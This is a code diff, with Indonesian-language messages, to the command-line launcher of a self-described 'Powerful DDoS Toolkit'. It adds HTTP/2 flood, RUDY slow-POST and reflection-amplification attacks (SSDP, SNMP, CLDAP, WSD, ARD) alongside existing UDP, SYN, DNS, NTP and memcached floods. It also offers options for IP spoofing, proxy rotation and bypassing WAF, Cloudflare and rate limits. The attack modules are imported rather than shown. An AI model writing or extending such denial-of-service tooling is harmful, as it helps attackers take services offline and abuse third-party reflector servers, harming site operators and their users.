@@ -15,6 +15,9 @@ from attacks import (
     ntp_amp,
     memcached_amp,
     bypass_attack,
+    http2_flood,
+    rudy,
+    amplification_flood,
 )
 from core.real_ip import detect_real_ip
 from core.proxy_scraper import scrape_proxies, scrape_user_agents
@@ -57,25 +60,30 @@ def load_user_agents(filepath):
     lines = [ln.strip() for ln in content.splitlines() if ln.strip() and not ln.startswith("#")]
     return lines
 
+def load_amp_servers():
+    filepath = "amp_servers.txt"
+    if not os.path.exists(filepath):
+        return []
+    with open(filepath, "r", encoding="utf-8") as f:
+        return [line.strip() for line in f if line.strip() and not line.startswith("#")]
+
 def run_port_scan(target):
-    """Run port scanner from port_scan_attack.py then optionally launch attack."""
     try:
         import port_scan_attack
         sys.argv = ["port_scan_attack.py", target]
         port_scan_attack.main()
     except ImportError:
         print("[!] port_scan_attack.py tidak ditemukan di folder yang sama.")
-        print("[!] Pastikan file tersebut ada di root ddos_toolkit/.")
         sys.exit(1)
     except SystemExit:
         pass
 
 def main():
-    parser = argparse.ArgumentParser(description="Powerful DDoS Toolkit with Proxy Scraper, Port Scanner, and Bypass Attacks")
+    parser = argparse.ArgumentParser(description="Powerful DDoS Toolkit with Proxy Scraper, Port Scanner, Bypass Attacks, HTTP/2, RUDY, and Amplification")
     parser.add_argument("--target", help="Target IP or domain")
     parser.add_argument("--port", type=int, default=80, help="Target port")
     parser.add_argument("--method",
-                        choices=["udp", "syn", "http", "slowloris", "dns", "ntp", "memcached", "icmp", "tcp", "bypass"],
+                        choices=["udp", "syn", "http", "slowloris", "dns", "ntp", "memcached", "icmp", "tcp", "bypass", "http2", "rudy", "amp"],
                         help="Attack method")
     parser.add_argument("--threads", type=int, default=100, help="Number of threads")
     parser.add_argument("--duration", type=int, default=60, help="Duration in seconds")
@@ -95,12 +103,16 @@ def main():
     # Bypass Attack
     parser.add_argument("--bypass-technique", type=str,
                         choices=["waf", "cloudflare", "rate_limit", "captcha", "fingerprint", "http2", "tls", "http_request_smuggling"],
-                        help="Teknik bypass yang digunakan (hanya untuk --method bypass)")
-    parser.add_argument("--https", action="store_true", help="Gunakan HTTPS/SSL untuk koneksi (terutama untuk bypass)")
+                        help="Teknik bypass (hanya untuk --method bypass)")
+    parser.add_argument("--https", action="store_true", help="Gunakan HTTPS/SSL")
+
+    # Amplification
+    parser.add_argument("--amp-type", type=str,
+                        choices=["ssdp", "snmp", "cldap", "wsd", "ard"],
+                        help="Tipe amplification (hanya untuk --method amp)")
 
     args = parser.parse_args()
 
-    # Mode scraper
     if args.scrape_proxies:
         proxies = scrape_proxies()
         print(f"[+] Scraping selesai. Total proxy unik: {len(proxies)}")
@@ -112,7 +124,6 @@ def main():
         print("[+] Disimpan ke ua.txt")
         return
 
-    # Mode port scanner
     if args.scan:
         if not args.target:
             parser.error("--target wajib diisi untuk mode --scan")
@@ -134,7 +145,6 @@ def main():
     print(f"[*] Starting {args.method.upper()} flood on {target}:{args.port}")
     print(f"[*] Threads: {args.threads}, Duration: {args.duration}s, Spoof: {args.spoof}")
 
-    # Load proxies jika diminta
     proxies = []
     if args.proxy or args.proxy_file:
         proxies = load_proxies(args.proxy_file)
@@ -143,7 +153,6 @@ def main():
             sys.exit(1)
         print(f"[+] Loaded {len(proxies)} proxies")
 
-    # Load user agents jika ada
     user_agents = []
     if args.ua_file:
         user_agents = load_user_agents(args.ua_file)
@@ -180,12 +189,29 @@ def main():
                                  technique=args.bypass_technique,
                                  proxies=proxies,
                                  use_https=args.https)
+        elif args.method == "http2":
+            http2_flood.attack(target, args.port, args.threads, args.duration, args.spoof,
+                               use_https=args.https)
+        elif args.method == "rudy":
+            rudy.attack(target, args.port, args.threads, args.duration, args.spoof,
+                        use_https=args.https)
+        elif args.method == "amp":
+            amp_servers = load_amp_servers()
+            if not amp_servers:
+                print("[!] Tidak ada server amplification di amp_servers.txt")
+                sys.exit(1)
+            amplification_flood.attack(target, args.port, args.threads, args.duration,
+                                       spoof=args.spoof,
+                                       protocol=args.amp_type or "ssdp",
+                                       servers=amp_servers)
         else:
             method_map[args.method](target, args.port, args.threads, args.duration, args.spoof)
     except KeyboardInterrupt:
         print("\n[!] Attack stopped")
     except PermissionError:
         print("[!] Root/Admin privileges required for raw socket attacks")
+    except ImportError as e:
+        print(f"[!] Library tidak ditemukan: {e}")
 
 if __name__ == "__main__":
     main()
